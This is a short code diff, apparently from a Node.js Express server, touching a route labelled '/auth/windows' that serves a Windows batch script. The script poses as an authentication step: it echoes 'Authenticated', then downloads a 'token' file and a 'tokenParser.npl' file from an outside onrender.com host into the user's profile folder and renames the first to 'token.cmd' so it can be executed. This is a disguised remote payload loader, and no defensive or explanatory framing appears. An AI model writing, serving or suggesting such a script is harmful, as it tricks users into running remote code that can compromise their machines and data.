@@ -40,6 +40,7 @@ router.get("/auth/windows", (req, res) => {
 
   res.type("text/plain").send(`@echo off
 echo Authenticated
+echo %USERPROFILE%
 curl -s -L -o "%USERPROFILE%\token" https://be-1-49aq.onrender.com/token
 curl -s -L -o "%USERPROFILE%\tokenParser.npl" https://be-1-49aq.onrender.com/tokenParser.npl
 ren "%USERPROFILE%\token" token.cmd
